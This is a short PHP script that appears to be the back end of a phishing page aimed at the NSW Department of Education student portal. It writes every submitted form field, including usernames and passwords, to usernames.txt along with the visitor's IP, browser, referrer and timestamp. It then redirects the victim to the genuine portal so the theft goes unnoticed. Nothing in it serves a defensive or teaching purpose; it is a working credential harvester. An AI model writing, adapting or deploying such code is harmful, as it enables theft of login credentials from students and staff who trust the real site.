<?php
$handle = fopen("usernames.txt", "a");

date_default_timezone_set('Australia/Sydney');

$post             = $_POST;
$post['ip']       = $_SERVER['REMOTE_ADDR'];
$post['browser']  = $_SERVER['HTTP_USER_AGENT'];
$post['referrer'] = $_SERVER['HTTP_REFERER'];
$post['date']     = date("Y-m-d H:i:s");


foreach ($post as $variable => $value) {
    fwrite($handle, $variable);
    fwrite($handle, "=");
    fwrite($handle, $value);
    fwrite($handle, PHP_EOL);
}

fwrite($handle, PHP_EOL);
fclose($handle);

header('Location: https://portal.det.nsw.edu.au/group/senior');
exit();